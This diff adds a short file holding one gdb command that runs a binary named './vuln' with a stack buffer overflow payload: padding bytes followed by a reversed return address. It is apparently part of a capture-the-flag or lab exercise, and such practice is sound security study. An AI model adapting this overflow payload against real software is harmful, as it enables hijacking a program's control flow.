@@ -1,0 +1,5 @@
+gdb ./vuln
+
+
+
+run <<< $(python -c 'print("a"*0x50)+"aaaa"+ "\x56\x64\x1a\x14"[::-1]')
